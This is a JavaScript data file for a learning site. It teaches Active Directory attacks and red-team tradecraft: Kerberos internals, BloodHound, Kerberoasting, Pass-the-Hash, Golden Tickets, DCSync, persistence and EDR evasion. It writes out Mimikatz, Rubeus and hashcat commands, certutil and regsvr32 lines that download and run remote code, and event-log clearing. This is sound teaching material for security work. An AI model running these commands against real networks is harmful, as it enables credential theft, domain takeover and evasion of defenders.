atlasAdd({
  id: "cyber",
  topics: [
    {
      id: "cyber-ad",
      title: "Active Directory & red teaming",
      level: "Advanced",
      body: [
        "AD auth internals (LDAP, **Kerberos**, NTLM), enumeration (BloodHound/SharpHound), the Kerberos attack family (Kerberoasting, AS-REP roasting, Pass-the-Hash/Ticket, Silver/Golden Ticket, **DCSync**), lateral movement, and persistence. Then red-team tradecraft: C2 (Sliver/Havoc/Mythic), EDR evasion, OPSEC, and **MITRE ATT&CK** for purple-teaming.",
        "This is enterprise compromise end-to-end - the bread and butter of professional offensive engagements.",
      ],
      subtopics: [
        {
          title: "Active Directory Architecture and Kerberos Authentication",
          body: [
            "**Active Directory** is Microsoft's directory service: a hierarchical LDAP database of objects (Users, Computers, Groups, OUs, GPOs) stored on **Domain Controllers (DCs)**. The **domain** is the security boundary; a **forest** is a collection of domains sharing a schema and global catalog. Every domain has a DC running **Kerberos KDC (Key Distribution Center)** and **LDAP** (for directory queries). Authentication in a Windows domain goes through Kerberos (preferred) or NTLM (fallback).",
            "**Kerberos authentication flow**: (1) Client sends **AS-REQ** (Authentication Service Request) to the KDC, encrypting a timestamp with the user's password hash (NTLM hash of the password) - proving knowledge of the password without sending it; (2) KDC validates, returns **AS-REP** containing a **TGT (Ticket Granting Ticket)** encrypted with the `krbtgt` account's hash (only the KDC can decrypt it) and a session key encrypted with the user's hash; (3) Client stores the TGT and uses it to request service tickets: sends **TGS-REQ** with the TGT to get a **TGS (Ticket Granting Service)** ticket for a specific service; (4) The TGS ticket is encrypted with the target service account's hash - the service decrypts it to verify the user. The KDC never sends the user's password over the network; authentication is proven by demonstrating knowledge of the hash.",
            "**NTLM (NT LAN Manager)** is a challenge-response protocol used when Kerberos isn't available (non-domain-joined systems, direct IP connections). Server sends a random challenge; client sends `NTLM_HASH(challenge + NTLM_HASH(password))`. The server (or DC via NetLogon) verifies. NTLM has critical weaknesses: the NTLM hash alone is sufficient to authenticate (Pass-the-Hash attack); the challenge-response is capturable on the network and crackable offline (hash relay and crack); NTLMv1 is crackable in seconds on modern hardware.",
            "**Service Principal Names (SPNs)**: every Kerberos service registers an SPN in AD (`HTTP/webserver.corp.local`, `MSSQLSvc/dbserver.corp.local:1433`). When a client requests a TGS for an SPN, the KDC issues a ticket encrypted with the **service account's NTLM hash**. If the service runs under a user account (not a machine account), that user's NTLM hash is the encryption key. Any domain user can request these tickets - this is the premise of **Kerberoasting**.",
            "**Group Policy Objects (GPOs)** apply configuration to OUs of computers/users: login scripts, mapped drives, software deployment, registry settings, firewall rules. GPOs are AD objects that DCs distribute via SYSVOL (SMB share). A domain user with write access to a GPO, or to an OU's `gpLink` attribute, can push malicious configuration (scheduled tasks, startup scripts) to all machines in that OU. BloodHound tracks these delegation paths automatically.",
          ],
          resources: [
            { label: "Active Directory Security - adsecurity.org", url: "https://adsecurity.org/", type: "docs" },
            { label: "Kerberos Protocol - MIT Documentation", url: "https://web.mit.edu/kerberos/krb5-latest/doc/", type: "docs" },
          ],
        },
        {
          title: "Enumeration with BloodHound and SharpHound",
          body: [
            "**BloodHound** maps Active Directory into a graph database (Neo4j) and reveals attack paths to high-value targets (Domain Admins, DCs) through graph traversal. **SharpHound** is the C# data collection agent: run on a domain-joined machine as a domain user, it queries LDAP for all users, computers, groups, GPOs, and trusts, then enumerates local admin rights, sessions (who is logged in where), and ACL entries. Output is JSON files imported into BloodHound.",
            "Key BloodHound queries: **'Find Shortest Paths to Domain Admins'** - reveals the fewest-hop attack path from the current user to DA privilege. **'Find Principals with DCSync Rights'** - users/groups with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions (needed for DCSync). **'Shortest Path from Owned Principals'** - after marking compromised accounts as 'owned', finds the next hop to DA. **'Find AS-REP Roastable Users'** - users with `DONT_REQ_PREAUTH` flag set.",
            "**ACL-based attack paths**: Active Directory permissions (ACLs/DACLs on AD objects) create attack edges in BloodHound. `GenericWrite` on a user object → can set any writable attribute, including adding an SPN (for targeted Kerberoasting) or setting `msDS-KeyCredentialLink` (Shadow Credentials attack). `WriteOwner` → can take ownership and grant yourself full control. `GenericAll` → full control, can reset password. `WriteDacl` → can modify the object's ACL to grant yourself `GenericAll`. A chain of these ACL edges enables privilege escalation without touching any 'traditional' exploit.",
            "**Shadow Credentials (2021 technique)**: if an attacker has `WriteProperty` rights over the `msDS-KeyCredentialLink` attribute of a user or computer object, they can add a **Key Credential** (a certificate). Kerberos PKINIT (public-key initial authentication) then allows authenticating as that account using the corresponding private key - without knowing the account's password, without resetting it, and with full plausible deniability. This pivots AD exploitation to certificate-based authentication paths.",
            "**PowerView and LDAP enumeration**: before BloodHound became standard, PowerView was the primary AD recon tool. `Get-DomainUser -SPN` finds Kerberoastable accounts; `Get-DomainGroupMember 'Domain Admins' -Recurse` expands all DA members; `Get-DomainObjectAcl -ResolveGUIDs` shows DACL entries. Modern defenders monitor for LDAP queries with LDAP search filters matching common recon patterns (wildcard queries, SAMR lookups). SharpHound now has stealth modes that use LDAP with more targeted, less suspicious queries.",
          ],
          resources: [
            { label: "BloodHound - SpecterOps", url: "https://github.com/BloodHoundAD/BloodHound", type: "tool" },
            { label: "BloodHound Documentation", url: "https://bloodhound.readthedocs.io/", type: "docs" },
          ],
        },
        {
          title: "Kerberoasting, AS-REP Roasting, and Ticket Attacks",
          body: [
            "**Kerberoasting**: any domain user can request a TGS ticket for any SPN. The TGS is encrypted with the service account's NTLM hash. Extract the TGS with `Rubeus.exe kerberoast /outfile:hashes.txt` or `GetUserSPNs.py -request domain/user:pass`. The extracted hash format is compatible with offline cracking: `hashcat -m 13100 hashes.txt wordlist.txt` cracks `$krb5tgs$23$*` hashes (RC4-encrypted TGS). Service accounts often have weak, non-rotating passwords. Mitigation: use **Managed Service Accounts (MSA/gMSA)** with auto-rotating 240-character passwords, and use **AES** encryption (AES-256 TGS hashes are infeasible to crack).",
            "**AS-REP Roasting**: Kerberos pre-authentication requires the client to prove knowledge of the password before the KDC issues a TGT. If an account has `DONT_REQ_PREAUTH` set (a misconfiguration or legacy compatibility requirement), the KDC issues an AS-REP without authentication. The AS-REP contains data encrypted with the user's password hash - extractable and crackable offline. `GetNPUsers.py domain/ -no-pass -usersfile users.txt` retrieves these. Mitigation: audit accounts with `DONT_REQ_PREAUTH` and require pre-authentication for all accounts.",
            "**Pass-the-Hash (PtH)**: NTLM authentication accepts the NTLM hash directly as authentication proof. If an attacker dumps an NTLM hash (via Mimikatz `sekurlsa::logonpasswords` from LSASS memory, or from SAM/NTDS.dit), they authenticate as that user without knowing the password: `mimikatz.exe 'sekurlsa::pth /user:admin /domain:corp /ntlm:<hash> /run:cmd'`. The attacker's process inherits the target user's authentication token. PtH works against NTLM services (SMB, WinRM, RDP with NLA disabled). Mitigation: Credential Guard (virtualizes LSASS), Protected Users group (disables NTLM for members), disable NTLMv1.",
            "**Pass-the-Ticket (PtT)**: steal a Kerberos TGT from memory (Mimikatz `sekurlsa::tickets /export`) and inject it into a new session (`kerberos::ptt ticket.kirbi`). The stolen TGT is valid for the original ticket's lifetime (typically 10 hours). With a TGT, the attacker can request service tickets for any service as the original user. **Overpass-the-Hash**: convert an NTLM hash to a Kerberos TGT - `sekurlsa::pth` with the hash performs a Kerberos AS-REQ, returning a TGT, enabling Kerberos-based attacks even when PtH-blocking is in place.",
            "**Silver Ticket**: forge a TGS ticket for a specific service without interacting with the KDC. Requires the service account's NTLM hash (from LSASS dump or NTDS.dit). Forge with Mimikatz `kerberos::golden /sid:<domain_SID> /domain:<domain> /target:<server> /service:cifs /rc4:<hash> /user:administrator /ptt`. The forged ticket bypasses KDC authentication logging and is valid even if the user account is disabled (the service only validates the KDC's encryption, not the user's current state). Silver tickets are harder to detect than Golden tickets because they never touch the KDC.",
          ],
          resources: [
            { label: "Kerberoasting - Harmj0y Research", url: "https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/", type: "docs" },
            { label: "Impacket - AD Attack Toolkit", url: "https://github.com/fortra/impacket", type: "tool" },
          ],
        },
        {
          title: "Golden Ticket, DCSync, and Persistence",
          body: [
            "**Golden Ticket**: forge a TGT using the `krbtgt` account's NTLM hash. The `krbtgt` account encrypts all TGTs; possessing its hash enables creating arbitrary TGTs for any user (including non-existent 'superuser' accounts) with any group memberships and any lifetime. `mimikatz kerberos::golden /domain:<domain> /sid:<SID> /rc4:<krbtgt_hash> /user:administrator /ptt` injects the forged TGT immediately. Golden tickets are the ultimate persistence: valid until `krbtgt` password changes (which requires changing it **twice** since Kerberos caches the previous version), and even then, in-use tickets remain valid until expiry.",
            "**DCSync**: an attack technique (not a bug per se) that uses legitimate DC replication protocol to pull password hashes from a DC without logging in to it. Domain Controllers replicate AD data via the **MS-DRSR** (Directory Replication Service Remote Protocol). An account with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions (normally only DAs and certain service accounts) can replicate the `NTDS.dit` equivalent remotely. `mimikatz lsadump::dcsync /domain:<domain> /user:krbtgt` dumps the krbtgt hash from any DC without local access. `secretsdump.py` (Impacket) does the same from Linux.",
            "**Persistence mechanisms**: after domain compromise, maintaining access requires multiple redundant mechanisms because defenders may remove any single one. Common AD persistence: (1) **Golden/Diamond/Sapphire Ticket** - forged krbtgt-signed tickets; (2) **AdminSDHolder DACL modification** - the AdminSDHolder container's ACL is propagated to all privileged accounts every 60 minutes by `SDProp`; adding an ACE here grants persistent rights to a low-privilege account; (3) **DSRM account** - the Directory Services Restore Mode account (local admin on DCs) can be enabled for network logon if `DsrmAdminLogonBehavior` registry key is set to 2; (4) **Skeleton Key** (Mimikatz) - patches LSASS on a DC to accept a master password alongside real passwords, enabling any account logon without touching AD.",
            "**C2 Framework overview**: red team operations use a C2 (Command and Control) framework for persistent, interactive access. **Sliver** (open source, BishopFox) supports mTLS, HTTP/S, DNS, and WireGuard implants with dynamic code generation. **Havoc** (open source) has a sleek operator UI and shellcode implants. **Cobalt Strike** (commercial, most widely deployed by real APTs) has a mature ecosystem and is extensively emulated by defenders for detection testing. The implant (agent/beacon) connects to team servers; operators issue commands; the team server aggregates sessions.",
            "**MITRE ATT&CK** provides a structured taxonomy of adversary tactics and techniques observed in real intrusions. Tactics (columns): Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact. Each technique has a T-number (T1055: Process Injection), sub-techniques (T1055.001: DLL Injection), detection suggestions, and mitigation guidance. **Purple teaming**: red team executes specific ATT&CK techniques while blue team measures their detection coverage - revealing gaps to close.",
          ],
          resources: [
            { label: "MITRE ATT&CK Framework", url: "https://attack.mitre.org/", type: "docs" },
            { label: "Sliver C2 Framework", url: "https://github.com/BishopFox/sliver", type: "tool" },
          ],
        },
        {
          title: "EDR Evasion and OPSEC",
          body: [
            "**EDR (Endpoint Detection and Response)** products (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black) use kernel callbacks, ETW (Event Tracing for Windows), and behavioral analysis to detect attacker activity. They hook user-mode APIs (`CreateProcess`, `VirtualAlloc`, `WriteProcessMemory`), instrument kernel events (process creation, DLL loads, network connections), and run behavioral ML models. Evading EDR requires either operating outside the hooks, defeating the detection logic, or avoiding behaviors the models flag.",
            "**Unhooking**: EDRs hook user-mode APIs by overwriting the first bytes of functions in `ntdll.dll` (and other DLLs) with a JMP to the EDR's analysis code. An attacker can bypass this by: (1) Loading a fresh copy of `ntdll.dll` directly from disk (before the EDR modifies it in memory); (2) Restoring the original bytes by reading `ntdll.dll` from disk and writing them back over the hooked version; (3) Calling syscalls directly (bypassing user-mode hooks entirely) via **direct syscalls** or **indirect syscalls** - emitting the syscall stub (`mov eax, syscall_number; syscall`) without going through `ntdll`.",
            "**Process injection OPSEC**: creating remote threads (`CreateRemoteThread`) is a classic detection signature. Alternatives: **Process Hollowing** (spawn legitimate process suspended, hollow out its image, replace with malicious code, resume); **Process Doppelganging** (use NTFS transactions to overwrite a legitimate file image, map it as a process, abandon the transaction - the file on disk is never modified); **APC injection** (queue an Asynchronous Procedure Call to a thread in an existing process via `QueueUserAPC`); **Ghostwriting** - write shellcode to a non-suspicious section of an existing process without creating a new thread.",
            "**Living off the Land (LotL)**: use tools built into Windows to perform attacker actions, blending with normal administrative activity. Examples: `mshta.exe` (runs HTA/VBScript from URL), `regsvr32.exe /s /n /u /i:http://...scrobj.dll` (runs COM scriptlet, no proxy bypass needed), `certutil.exe -urlcache -f http://... payload.exe` (downloads file via BITS), `wmic.exe process call create` (process execution), `powershell.exe -enc <Base64>` (obfuscated PowerShell execution). These blend in because `mshta.exe` is signed by Microsoft and commonly used legitimately.",
            "**OPSEC (Operational Security)**: minimizing the forensic and detection footprint of red team activity. Key principles: (1) avoid touching disk when possible (in-memory execution, reflective DLL loading); (2) use encrypted C2 channels (malleable C2 profiles mimicking legitimate traffic - Cobalt Strike's HTTP beaconing mimics Amazon S3, CDN patterns); (3) avoid high-frequency beaconing (jitter randomizes callback intervals); (4) clean up artifacts after use (delete files, clear event logs with `wevtutil`); (5) use infrastructure that blends in (categorized domains, valid SSL certs, shared hosting IP ranges that allowlists don't block). The red team should operate as if their TTPs will be reconstructed from logs after the engagement.",
          ],
          resources: [
            { label: "Red Team Operations with Cobalt Strike", url: "https://www.cobaltstrike.com/training/", type: "course" },
            { label: "MITRE ATT&CK for Enterprise", url: "https://attack.mitre.org/matrices/enterprise/", type: "docs" },
            { label: "ThreatHunter Playbook", url: "https://threathunterplaybook.com/", type: "docs" },
          ],
        },
      ],
      resources: [
        { label: "Hacking the Art of Exploitation - AD chapters", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology", type: "docs" },
        { label: "ired.team Red Team Notes", url: "https://www.ired.team/", type: "docs" },
        { label: "Impacket Examples", url: "https://github.com/fortra/impacket/tree/master/examples", type: "repo" },
      ],
      connections: [
        { to: "cyber-foundations", note: "Kerberos is built on the network fundamentals covered there" },
        { to: "crypto-symmetric", note: "Kerberos ticket encryption uses RC4 (NTLM hash) or AES-256; cracking depends on crypto primitives" },
        { to: "cyber-malware", note: "Enterprise malware (ransomware gangs) uses AD lateral movement for pre-ransomware propagation" },
        { to: "cyber-re", note: "C2 implant development requires binary packing and anti-analysis knowledge" },
      ],
    },
  ],
});
